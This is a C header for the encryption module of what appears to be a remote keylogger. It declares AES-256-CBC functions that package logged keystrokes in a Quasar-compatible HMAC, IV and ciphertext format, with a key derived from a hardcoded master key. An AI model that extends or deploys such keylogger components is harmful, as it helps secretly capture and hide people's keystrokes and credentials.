/**
 * remote_keylogger_aes.h
 * AES-256-CBC for keylog files. Same format as C# Quasar: [HMAC 32][IV 16][Ciphertext].
 * Key derived via PBKDF2 (SHA-1, 50000 it) from hardcoded master key + salt.
 */
#ifndef REMOTE_KEYLOGGER_AES_H
#define REMOTE_KEYLOGGER_AES_H

#include <stddef.h>

#define KEYLOG_AES_KEY_BYTES  32
#define KEYLOG_AES_IV_BYTES   16
#define KEYLOG_AES_HMAC_BYTES 32

/* Encrypt plain_len bytes. Output format: [HMAC 32][IV 16][Ciphertext]. out must be at least 32+16+((plain_len/16+1)*16). */
int keylog_aes_encrypt(const unsigned char* plain, size_t plain_len, unsigned char* out, size_t* out_len);

/* Decrypt C#-format [HMAC 32][IV 16][Ciphertext]. in_len must be >= 32+16. Writes plaintext to out, sets *out_len. */
int keylog_aes_decrypt(const unsigned char* in, size_t in_len, unsigned char* out, size_t* out_len);

#endif
